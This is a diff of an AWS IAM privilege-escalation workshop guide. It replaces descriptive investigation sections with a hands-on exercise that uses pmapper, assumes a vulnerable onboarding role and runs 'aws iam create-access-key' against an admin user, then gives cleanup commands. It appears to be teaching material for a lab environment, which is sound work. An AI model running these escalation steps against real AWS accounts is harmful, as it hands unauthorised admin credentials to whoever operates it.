@@ -156,75 +156,71 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 
 ---
 
-### Path 2: UpdateAssumeRolePolicy (Principal Access)
+## Exercise 3: Scenario 2 - CreateAccessKey (Principal Access)
 
-**pmapper Investigation:**
+The `iamws-team-onboarding-user` can create access keys for any IAM user, including admin users.
 
-Query the user's escalation path:
+### Part A: Identify with pmapper
 
-```bash
-pmapper query "can privesc14-UpdatingAssumeRolePolicy do iam:UpdateAssumeRolePolicy with *"
-```
-
-This user can modify trust policies on roles, allowing them to grant themselves access to assume privileged roles.
-
-**pathfinding.cloud Investigation:**
-
-1. Navigate to **Principal Access** → **[IAM-012: iam:UpdateAssumeRolePolicy](https://pathfinding.cloud/paths/iam-012)**
-
-2. Review the path details:
-   - **Description** — How modifying trust policies enables escalation
-   - **Required Permissions** — The dangerous combination of permissions
-   - **Attack Steps** — The specific API calls an attacker would use
-   - **Remediation** — Trust policy hardening strategies
-
----
-
-### Path 3: PassRole + EC2 (New PassRole)
-
-**pmapper Investigation:**
-
-Query the user's ability to pass roles:
-
-```bash
-pmapper query "can privesc3-CreateEC2WithExistingIP do iam:PassRole with *"
-```
-
-This user can pass high-privilege roles to EC2 instances they create, then access those credentials.
-
-**pathfinding.cloud Investigation:**
-
-1. Navigate to **New PassRole** → **[EC2-001: iam:PassRole + ec2:RunInstances](https://pathfinding.cloud/paths/ec2-001)**
-
-2. Review the path details:
-   - **Description** — How PassRole enables privilege escalation through compute services
-   - **Required Permissions** — The PassRole + service combination
-   - **Attack Steps** — Creating an instance and harvesting credentials
-   - **Remediation** — Condition key restrictions on PassRole
-
----
-
-### Path 4: CreateAccessKey (Principal Access)
-
-**pmapper Investigation:**
-
-Query for users who can create access keys for other principals:
+Query for users who can create access keys:
 
 ```bash
 pmapper query "who can do iam:CreateAccessKey with *"
 ```
 
-This identifies users who can create credentials for other IAM users—potentially including admin users.
+Look for this line:
+```
+user/iamws-team-onboarding-user IS authorized to call action iam:CreateAccessKey for resource *
+```
 
-**pathfinding.cloud Investigation:**
+### Part B: Understand via pathfinding.cloud
 
-1. Navigate to **Principal Access** → **[IAM-002: iam:CreateAccessKey](https://pathfinding.cloud/paths/iam-002)**
+1. Navigate to [pathfinding.cloud IAM-002](https://pathfinding.cloud/paths/iam-002)
+2. Review the **Attack Steps** section
 
-2. Review the path details:
-   - **Description** — How creating keys for other users enables escalation
-   - **Required Permissions** — The unrestricted CreateAccessKey permission
-   - **Attack Steps** — Creating keys for privileged users
-   - **Remediation** — Resource constraints limiting key creation to self
+### Part C: Exploit
+
+Create access keys for a privileged user:
+
+```bash
+# Get credentials for the vulnerable user
+export $(printf "AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s" \
+  $(aws sts assume-role \
+    --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/iamws-team-onboarding-role \
+    --role-session-name exploit \
+    --query "Credentials.[AccessKeyId,SecretAccessKey,SessionToken]" \
+    --output text))
+
+# Verify identity
+aws sts get-caller-identity
+
+# Create access key for an admin user (cloud-foxable has admin permissions)
+aws iam create-access-key --user-name cloud-foxable
+```
+
+Expected output:
+```json
+{
+    "AccessKey": {
+        "UserName": "cloud-foxable",
+        "AccessKeyId": "AKIA...",
+        "Status": "Active",
+        "SecretAccessKey": "..."
+    }
+}
+```
+
+### Cleanup
+
+Delete the created access key:
+
+```bash
+# Note the AccessKeyId from the output above
+aws iam delete-access-key --user-name cloud-foxable --access-key-id <ACCESS_KEY_ID>
+
+# Reset credentials
+unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+```
 
 ---
 
